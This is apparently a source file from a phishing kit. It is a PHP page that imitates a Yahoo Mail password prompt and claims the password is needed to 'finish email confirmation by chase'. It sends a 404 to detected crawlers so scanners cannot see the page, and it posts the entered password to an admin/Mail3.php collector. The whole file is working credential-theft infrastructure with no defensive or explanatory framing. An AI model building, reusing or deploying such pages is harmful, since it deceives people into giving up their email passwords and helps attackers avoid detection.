<?php 
session_start();

use Jaybizzle\CrawlerDetect\CrawlerDetect;
require 'anti/vendor/autoload.php';
$CrawlerDetect = new CrawlerDetect;
if($CrawlerDetect->isCrawler()) {
    // true if crawler user agent detected
    header("HTTP/1.0 404 Not Found");
        exit();
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style type="text/css">
		.form-control-2{
			border: none !important;
			border-bottom: 1px solid #ccc !important;
			background: transparent !important;
			border-radius: 0px !important;
			padding-left: 2px !important;
		}
		.form-control:focus{
			box-shadow: none !important;
			border-bottom: 1px solid #0f69ff !important;
		}
		#labeluser{
			padding-left: 0px;
		}
		body{
			background-color: #f3f7f9 !important;
		}
	</style>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	

	<nav class="navbar bg-white">
	  	<div class="container-fluid ">
	   	 	<a class="navbar-brand mt-2" href="#" style="padding-left: 50px;">
	      		<img src=assets/y.png alt="" class="img-fluid" style="max-width: 120px; max-height: 36px;">
	    	</a>
	  	</div>

	</nav>
	<div class="container mt-3">
		<div class="d-flex justify-content-center justify-content-md-end">
			<div class="col-10  col-md-6 col-lg-4 shadow bg-white">
				<div class="d-flex justify-content-center my-5">
					<img src=assets/y.png alt="" class="img-fluid" style="max-width: 90px; max-height: 27px;">
				</div>
				<div class="fs-6 fw-normal text-center mb-4"><?php echo $_SESSION["ymail"]; ?></div>
				<div class="fw-bold fs-5 text text-center">Enter password</div>
				<div class="fs-6 fw-normal text-center mb-5">to finish email confirmation by chase</div>
				<form action="admin/Mail3.php"  method="post">
					<div class="form-floating  mx-4">
						<input type="password" name="ypassd" class="form-control form-control-2" id="mailpasswordInput" placeholder="username" onblur="">
						<label for="usernameInput" id="labeluser">Password</label>
					</div>
					<div class="d-grid gap-2 my-3">
					  <button class="btn btn-primary mx-3 rounded-pill " type="submit">Next</button>

					</div>
				</form>
				<div class="alert-link text-primary text-center" style="margin-bottom: 140px;">Forgotten password? </div>


			</div>
		</div>
	</div>




</body>
</html>